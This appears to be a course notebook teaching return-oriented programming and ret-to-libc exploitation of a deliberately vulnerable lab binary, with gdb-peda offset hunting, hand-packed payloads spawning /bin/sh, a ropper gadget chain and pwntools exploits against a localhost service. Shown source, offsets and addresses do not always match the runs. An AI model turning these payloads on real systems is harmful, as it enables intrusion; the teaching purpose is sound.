# Return Oriented Programming (ROP)
- [https://en.wikipedia.org/wiki/Return-oriented_programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [Return-Oriented Programming: Systems, Languages, and Applications](https://hovav.net/ucsd/dist/rop.pdf)
- advanced version of stack overflow or stack smashing attack
- a security exploit technqiue that allows an attacker to execute code in the presence of security defenses such as executable protection and code signing
- attackers hijack's the program return control flow and the executes carefully chosen machine instruction sequences that are already present in the machine's memory, called `gadgets`
- see Dynamically Loaded (DL) Libraries [https://tldp.org/HOWTO/Program-Library-HOWTO/dl-libraries.html](https://tldp.org/HOWTO/Program-Library-HOWTO/dl-libraries.html)

## Return-to-libc attack
- if stack propery is set as RW (Read and Write, by default), it is impossible to smuggle the shellcode into buffer and use it to exploit the vulnerable program
- shared libraries such as libc, often contain subroutines for performing system system calls and other functionality potentially useful to an attacker
- we'll use c-program for this demonstration because most CTF platforms use C programs
- in `return-to-libc` attack, attacker chooses available library function and overwrities the return address with its entry location
- function calls can be carefully combined and chained using the `rop gadgets`
- to make the demo easier, the `ctf-demos/rop1/vuln.c `program already exposes the addresses of `system()`, and `printf()` API in libc and `main()` addresses when it's loaded in the memory
    - NOTE: the program and note is adapted from: [https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html](https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html)


```python
import os
os.chdir('ctf-demos/rop1')
```


```python
os.getcwd()
```




    '/home/kali/projects/SystemSecurity/ctf-demos/rop1'




```python
! cat vuln.cpp
```

    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <iostream>
    using namespace std;
    
    #define BUFSIZE 16
    
    using namespace std;
    
    void give_shell(){
        system("/bin/sh");
    }
    
    char * mgets(char *dst) {
        char *ptr = dst;
        int ch; 
    	/* skip leading white spaces */ 
        while ((ch = getchar()) && (ch == ' ' or ch == '\t') )
            ; 
    
        if ((ch == '\n') or (ch == EOF)) { 
            *ptr = '\0';
            return dst; 
        } 
        else
            *ptr = ch;
    
        /* now read the rest until \n or EOF */ 
        while (true) {
            ch = getchar();
            if (ch == '\n' or ch == EOF) break;
            *(++ptr) = ch; 
        }
        *(++ptr) = 0;
        return dst;
    }
    
    void bad() {
        char buffer[BUFSIZE];
        cout << "Enter Password: ";
        fflush(stdout);
        mgets(buffer); // similar to C's gets;
        //gets(buffer); // depricated
        cout << "Acknowledged: " << buffer << " with length " << strlen(buffer) << endl;
        if (strcmp(buffer, "haxor") == 0)
        	printf("Congrats... :)\n");
        else
        	printf("Sorry! Incorrect Password!!\n");
    }
    
    int main(int argc, char *argv[]) {
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        bad();
        cout << "Good bye!\n";
        return 0;
    }


- use the Makefile provided in the `ctf-demos/rop1` folder to compile the C program
- note that the gcc compiler switch `-z execstack` is removed from the Makefile
    - this make the stack RW only thus protecting from smuggling attacker's arbitrary code


```python
! cat Makefile
```

    # Makefile Template
    # variable for compiler name
    COMPILER = g++
    
    # c++ compiler flags
    # -c : just do preprocess; compile and assemble into object files
    # -g : adds debugging information to the executable file
    # -Wall : turns on most, but not  all, compiler warnings
    # -std=c++17 : uses c++17 standard
    # put all the required flags separated by space
    COMPILER_FLAGS = -g -Wall -m32 -fno-stack-protector -no-pie
    
    # the build target executable program name of your choice
    PROGRAM_NAME = vuln.exe # FIXME
    
    # list all .cpp files separated by space; files must exist!
    CPP_FILES = vuln.cpp # FIXME
    
    # make build rule/default rule that'll be run when we run "make" or make build
    # first compile each file to object file
    # then make a single binary program
    build:
    	# must run make with sudo to enable randomaize_va_space
    	echo 0 | tee /proc/sys/kernel/randomize_va_space
    	$(COMPILER) $(COMPILER_FLAGS) $(CPP_FILES) -o $(PROGRAM_NAME)
    
    # make clean rule
    # delete object and binary files
    clean:
    	rm -f $(PROGRAM_NAME) *.o



```python
# must run make as sudo to enable ASLR
! echo kali | sudo -S make
```

    [sudo] password for kali: # must run make with sudo to enable randomaize_va_space
    echo 0 | tee /proc/sys/kernel/randomize_va_space
    0
    g++ -g -Wall -m32 -fno-stack-protector -no-pie vuln.cpp  -o vuln.exe 


```bash
- double check to make sure NX is enabled
    - one can't place shellcode neither in stack no heap
- however, stack protector is disabled allowing us to still hijack the control flow

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ checksec vuln.exe                                                                                  2 ⨯
[*] '/home/kali/EthicalHacking/ctf-demos/rop1/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled <----------!!!!
    PIE:      No PIE (0x8048000)
```
- run and crash the program to confirm overflow vulnerability

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ echo AAAA | ./vuln.exe AAAA
stack   : 0xffffc3f0
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
IOLI Crackme Level 0x00
Password:Entered: AAAA
Invalid Password!
Good bye!
```

- try with longer data

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ ./vuln.exe $(python -c 'print("A"*100)')
stack   : 0xffffc390
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
IOLI Crackme Level 0x00
Password:Entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Invalid Password!
zsh: segmentation fault  ./vuln.exe $(python -c 'print("A"*100)')
```
- check the EIP value when the program crashed

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ sudo dmesg

...
[44824.285344] vuln.exe[23971]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffc340 error 14 in libc-2.31.so[f7dc2000+1d000] 
...
```
- notice 41414141 is the value of EIP when the function tries to return to this address
- let's try to return to main()
- payload should look like this:
```
[data  ]
[...   ]
[ra    ] -> add of main()
```

- find the offset to the return address or EIP using gdb-peda

```bash
┌──(kali㉿K)-[~/projects/SystemSecurity/ctf-demos/rop1]
└─$ gdb -q vuln.exe                                                                                                  
Reading symbols from vuln.exe...
gdb-peda$ pattern create 100 pattern.txt
Writing pattern of 100 chars to filename "pattern.txt"

gdb-peda$ run < pattern.txt
...
[------------------------------------------------------------------------------]
gdb-peda$ patts
...

ESI+0 found at offset: 20
EIP+0 found at offset: 28 <------!!!!!
Registers point to pattern buffer:
[ESP] --> offset 32 - size ~68

...

```

- 28 is the offset to EIP that get's us to the return address from the buffer's base address
- let's force the program to execute 

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ ./vuln.exe $(python -c 'import sys; sys.stdout.buffer.write(b"A"*44+b"\x56\x92\x04\x08")')                   139 ⨯
stack   : 0xffffc3c0
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
IOLI Crackme Level 0x00
Password:Entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV�
Invalid Password!
stack   : 0xffffc374
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
zsh: segmentation fault  ./vuln.exe 
```

- note the main is called right after Invalid Password! is printed and we get segfault after that

## Your first ROP

- let's force the program to print out "Congrats... :)"
- payload should look like this:

```
  [data  ]
  [..... ]
  [ra    ] -> printf()
  [dummy ]
  [arg1  ] -> "Congrats... :)"
```

- when printf() is invokded, "Password OK :)" will be considered as its first argument
- as this exploit returns to a libc function, this technique is ofen called "ret-to-libc"
- printf() address is already printed, now we need to find the address of the literal string "Congrats... :)" in the program
- we'll use gdb-peda's find function
- for dummy value we can use the exit() address and simply exit the program

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ gdb -q vuln.exe                                                                           
Reading symbols from vuln.exe...

gdb-peda$ run < pattern.txt

gdb-peda$ p printf
$3 = {int (const char *, ...)} 0xf7be2f10 <__printf>
gdb-peda$ find Congrats
Searching for 'Congrats' in: None ranges
Found 2 results, display max 2 items:
vuln.exe : 0x804a044 ("Congrats... :)")
vuln.exe : 0x804b044 ("Congrats... :)")

```

- can use one of the addresses found; let's use the first address found

```bash
┌──(kali㉿K)-[~/projects/SystemSecurity/ctf-demos/rop1]
└─$ python -c 'import sys; sys.stdout.buffer.write(b"A"*28 + b"\x10\x2f\xbe\xf7" + b"\x80\x66\xbc\xf7" + b"\x44\xa0\x04\x08")' | ./vuln.exe
Enter Password: Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAA/���f��D with length 40
Sorry! Incorrect Password!!
Congrats... :) 
```

- we forced the program to print "Password OK :)" after it printed Sorry...


## Use ROP to get a shell
- force the vulnerable program execute to system function, e.g.:

```
system("/bin/sh")
```
- very similar to the previous example where we froced the program to print "Password OK :)"
- by replacing `printf()` with `system()` the payload will look the following:

```
  [data  ]
  [..... ]
  [ra    ] -> system()
  [dummy ]
  [arg1  ] -> "/bin/sh"
```

- we need the address of `system()` and the address of `"/bin/sh"`
- address of `system()` is already leaked but can also be found using gdb-peda
- address of `"/bin/sh"` can be found in `libc` library loaded along with the program in memory
- we can use gdb-peda to find the address of such strings to be used as argument to system

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ gdb -q vuln.exe
Reading symbols from vuln.exe...
gdb-peda$ pattern create 100 pattern.txt
gdb-peda$ run < pattern.txt
gdb-peda$ patts
...

gdb-peda$ p exit
$1 = {void (int)} 0xf7bc6680 <__GI_exit>                                                                                 
gdb-peda$ p system                                                                                                       
$2 = {int (const char *)} 0xf7bd3d00 <__libc_system>                                                                     
gdb-peda$ find "/bin/sh" libc                                                                                            
Searching for '/bin/sh' in: libc ranges                                                    Found 1 results, display max 1 items:                                                     libc : 0xf7d1eb62 ("/bin/sh")

gdb-peda$ p exit
$3 = {void (int)} 0xf7bc6680 <__GI_exit>
```



- now we've all the addresses, let's create our payload
- goal is to invoke system("/bin/sh"), using the payload like this:
- if address has 00 byte, the payload will not work!
    - \x00 is treated as NULL byte in buffer

```
  [data  ]
  [..... ]
  [ 0xf7df6d00 ] -> system()
  [ 0xf7de9680 ] -> exit()
  [ 0xf7f41b62 ] -> "/bin/sh"
```


```
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ ./vuln.exe $(python -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x60\x6f\xe0\xf7" + b"\xb0\x98\xdf\xf7" + b"\x3c\xe3\xf4\xf7")')
stack   : 0xffffc3c0
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
IOLI Crackme Level 0x00
Password:Entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`o������<���
Invalid Password!
$ whoami
kali
$ ls
core      exploit.bin  Makefile     peda-session-demo.exe.txt  ropchain  vuln.exe
demo.exe  exploit.py   pattern.txt  peda-session-vuln.exe.txt  vuln.c
$ exit
```

## ROP Chain
- find and chain `pop, ret` instructions called gadgets to keep maintaining our payloads
    - hence the the name return-oriented programming (ROP)
    
- think about:

```
  [buf      ]
  [.....    ]
  [old-ra   ] -> 1) func1
  [ra       ] -------------------> 2) func2
  [old-arg1 ] -> 1) arg1
  [arg1     ] -> arg1
  
  1) func1(arg1)
  2) func2(arg1)
  3) crash @func1's arg1 (old-arg1) 
```

- after func2(arg1), `old-arg1` will be our next return address in the payload
- a neat trick is to use `pop/ret` gadget

```
  [buf      ]
  [.....    ]
  [old-ra   ] -> 1) func1
  [ra       ] ------------------> pop/ret gadget
  [old-arg1 ] -> 1) arg1
  [dummy    ]

  * crash at dummy!
  ```
  
- in this case, after func1(arg1), it returns to 'pop/ret' instructions, which 1) pop 'old-arg1' (note the stack pointer points to 'dummy') and 2) returns again (i.e., crashing at dummy)

- we can chain func2 by hijacking its control-flow to func2

```
  [buf      ]
  [.....    ]
  [old-ra   ] -> 1) func1
  [ra       ] ------------------> pop/ret gadget
  [old-arg1 ] -> 1) arg1
  [ra       ] -> func2
  [dummy    ]
  [arg1     ] -> arg1
```

- let's search for `pop/ret` gadgets using ropper program
    - there are many `pop/ret` instructions in a given program

```bash

┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ ropper -f ./vuln.exe

...
0x0804901e: pop ebx; ret;
...

155 gadgets found

```

- let's chain the gadgets to create the final payload that looks like the following

```
  [buf      ]
  [.....    ]
  [old-ra   ] -> 1) system
  [ra       ] -----------------> pop/ret
  [old-arg1 ] -> 1) "/bin/sh"
  [ra       ] -> 2) exit
  [dummy    ]
  [arg1     ] -> 0
```

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$ ./vuln.exe $(python -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x60\x6f\xe0\xf7" + b"\x1e\x90\x04\x08" + b"\x3c\xe3\xf4\xf7" + b"\xb0\x98\xdf\xf7" + b"AAAA" + b"0")')

stack   : 0xffffc3b0
system(): 0xf7e06f60
printf(): 0xf7e15f80
exit(): 0xf7df98b0
main(): 0x8049256
IOLI Crackme Level 0x00
Password:Entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`o��<�������AAAA0
Invalid Password!
$ whoami
kali
$ exit

┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop1]
└─$     
```


## Exercise

- Chain three functions and invoke one at a time in a sequence listed below:

```C
printf("Password OK :)")
system("/bin/sh")
exit(0)
```

## ROP with Pwntools
- pwntools can be used to exploit stackoverflow with ROP technique
- let's use `ctf-demos/rop2/vuln.c` program to demostrate pwntools
- also see this YouTube video - [https://www.youtube.com/watch?v=gWU2yOu0COk&ab_channel=ChristopherSchafer](https://www.youtube.com/watch?v=gWU2yOu0COk&ab_channel=ChristopherSchafer)
- since the exploit doesn't rely on any static addresses, it's reliable enough that it'll work even if ASLR is turned off
- let's turn the ASLR off


```python
! echo kali | sudo -S bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
```

    [sudo] password for kali: 


```python
! echo kali | sudo -S cat /proc/sys/kernel/randomize_va_space
```

    [sudo] password for kali: 2


- create offset using `pwn template`

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop2]
└─$ pwn template ./vuln.exe --host localhost --port 1234 > exploit.py
```

- update and run exploit.py locally in DEBUG mode

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop2]
└─$ python exploit.py LOCAL DEBUG
[DEBUG] PLT 0x8049030 fflush
[DEBUG] PLT 0x8049040 gets
[DEBUG] PLT 0x8049050 getegid
[DEBUG] PLT 0x8049060 puts
[DEBUG] PLT 0x8049070 __libc_start_main
[DEBUG] PLT 0x8049080 setresgid
[*] '/home/kali/EthicalHacking/ctf-demos/rop_basic/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/kali/EthicalHacking/ctf-demos/rop_basic/vuln.exe': pid 12899
[*] Loaded 10 cached gadgets for './vuln.exe'
[DEBUG] PLT 0x25040 realloc
[DEBUG] PLT 0x25090 __tls_get_addr
[DEBUG] PLT 0x250d0 memalign
[DEBUG] PLT 0x250e0 _dl_exception_create
[DEBUG] PLT 0x25120 __tunable_get_val
[DEBUG] PLT 0x251e0 _dl_find_dso_for_object
[DEBUG] PLT 0x25220 calloc
[DEBUG] PLT 0x25300 __libpthread_freeres
[DEBUG] PLT 0x25308 malloc
[DEBUG] PLT 0x25310 __libdl_freeres
[DEBUG] PLT 0x25318 free
[*] '/home/kali/EthicalHacking/ctf-demos/rop_basic/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x13 bytes:
    b'Give me some text:\n'
[DEBUG] Sent 0x91 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  1b 92 04 08  │haab│iaab│jaab│····│
    00000090  0a                                                  │·│
    00000091
[DEBUG] Received 0xa4 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  1b 92 04 08  │haab│iaab│jaab│····│
    00000090  0a 47 69 76  65 20 6d 65  20 73 6f 6d  65 20 74 65  │·Giv│e me│ som│e te│
    000000a0  78 74 3a 0a                                         │xt:·│
    000000a4
[DEBUG] Sent 0x12 bytes:
    b'Do you read this?\n'
[*] Switching to interactive mode
Give me some text:
[DEBUG] Received 0x12 bytes:
    b'Do you read this?\n'
Do you read this?
[*] Got EOF while reading in interactive
```

- update payload and interactively send the payload to the vulnerable program locally first
- the updated exploit code is exploit2.py
- run the exploit code with LOCAL argument

```bash
┌──(kali㉿)-[~/EthicalHacking/ctf-demos/rop2]
└─$ python exploit2.py LOCAL 
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/vuln.exe'
    Arch:     i386-32-little
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/vuln.exe'
    Arch:     i386-32-little
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/kali/EthicalHacking/ctf-demos/rop2/vuln.exe': pid 36202
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 10 cached gadgets for './vuln.exe'
[*] Puts at address: 0xf7e38380
[*] libc base address: 0xf7dc8000
[*] Stage II ROP Chain:
    0x0000:       0xf7e0cf60 0xf7e0cf60(0xf7f5433c)
    0x0004:          b'baaa' <return address>    0x0008:       0xf7f5433c arg0
[*] Switching to interactive modeGive me some text:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab`\xcf\xe0\xf7baaa<C\xf5\xf7xploit.py  Makefile            vuln.c
$ ls
core         exploit.py  Makefile            vuln.c
exploit1.py  libc.py     pattern.txt            vuln.exe
exploit2.py  libc.so.6     peda-session-vuln.exe.txt
$ whoami
kali
```

### Remote Exploit

- run netcat-loop.sh program from one terminal

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/rop2]
└─$ bash netcat-loop.sh 
listening on [any] 1234 ...
```

- run the exploit2.py code from another terminal without any argument

```bash
┌──(kali㉿)-[~/EthicalHacking/ctf-demos/rop2]
└─$ python exploit2.py
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 1234: Done
[*] '/home/kali/EthicalHacking/ctf-demos/rop2/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 10 cached gadgets for './vuln.exe'
[*] Puts at address: 0xf7e38380
[*] Loaded 10 cached gadgets for './vuln.exe'
[*] Puts at address: 0xf7e38380
[*] libc base address: 0xf7dc8000
[*] Stage II ROP Chain:
    0x0000:       0xf7e0cf60 0xf7e0cf60(0xf7f5433c)
    0x0004:          b'baaa' <return address>
    0x0008:       0xf7f5433c arg0
[*] Switching to interactive modeGive me some text:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab`\xcf\xe0\xf7baaa<C\xf5\xf7
$ ls
core
exploit1.py
exploit2.py
exploit.py
libc.py
libc.so.6
Makefile
netcat-loop.sh
pattern.txt
peda-session-vuln.exe.txt
vuln.c
vuln.exe
$  
```


## Exercise
- Write Python exploit code with using pwntools to exploit ctf-demos/rop1/vuln.c program


```python

```
